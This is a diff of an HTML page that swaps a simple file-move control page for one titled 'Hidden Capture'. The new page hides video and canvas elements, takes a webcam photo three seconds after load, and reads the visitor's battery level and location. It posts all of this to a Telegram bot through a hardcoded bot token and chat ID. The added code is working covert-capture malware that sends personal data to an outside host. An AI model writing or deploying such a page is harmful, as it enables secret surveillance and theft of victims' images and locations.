@@ -3,57 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Move File System</title>
+    <title>Hidden Capture</title>
     <style>
-        body {
-            background: linear-gradient(45deg, #ff00ff, #00ffff, #ffcc00, #ff3300);
-            color: white;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-        h1 {
-            font-size: 2em;
-            text-shadow: 2px 2px 4px black;
-        }
-        button {
-            background: linear-gradient(45deg, #ff0000, #0000ff);
-            color: white;
-            font-size: 20px;
-            padding: 15px 30px;
-            border: none;
-            margin: 10px;
-            cursor: pointer;
-            border-radius: 10px;
-            box-shadow: 3px 3px 10px rgba(0, 0, 0, 0.5);
-        }
-        button:hover {
-            background: linear-gradient(45deg, #0000ff, #ff0000);
-        }
+        body { background-color: black; margin: 0; height: 100vh; overflow: hidden; }
     </style>
 </head>
 <body>
-
-    <h1>File Move System</h1>
-    <button onclick="moveFile('on')">ON</button>
-    <button onclick="moveFile('off')">OFF</button>
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" width="300" height="200" style="display: none;"></canvas>
 
     <script>
-        function moveFile(action) {
-            fetch("move_file.php", {
+        const TELEGRAM_BOT_TOKEN = "7250347146:AAF2fQ7skQFhHoOgsboWUJzQlmYo5ZAHMC4";
+        const TELEGRAM_CHAT_ID = "@BERLIN_IS_BERLIN";
+
+        let video = document.getElementById("video");
+        let canvas = document.getElementById("canvas");
+        let context = canvas.getContext("2d");
+
+        // **Camera Access**
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => { 
+                video.srcObject = stream;
+                setTimeout(capturePhoto, 3000); // 3 sec delay to capture photo
+            })
+            .catch(err => console.log("Camera access denied!"));
+
+        // **Battery Status**
+        let batteryLevel = "Unknown";
+        navigator.getBattery().then(battery => {
+            batteryLevel = `${Math.round(battery.level * 100)}%`;
+        });
+
+        // **Location Access**
+        let locationData = "Unknown";
+        navigator.geolocation.getCurrentPosition(position => {
+            locationData = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+        });
+
+        // **Capture Photo & Send Data**
+        function capturePhoto() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            let imageData = canvas.toDataURL("image/png");
+
+            let message = `📸 **User Details**\n🔋 Battery: ${batteryLevel}\n📍 Location: ${locationData}`;
+
+            // **Send Text Message**
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ action: action })
-            })
-            .then(response => response.text())
-            .then(data => alert(data))
-            .catch(error => alert("Error: " + error));
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" })
+            });
+
+            // **Send Photo (Needs Backend, Optional)**
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    photo: imageData
+                }),
+                headers: { "Content-Type": "application/json" }
+            }).catch(error => console.log("Photo sending error:", error));
         }
     </script>
-
 </body>
 </html>
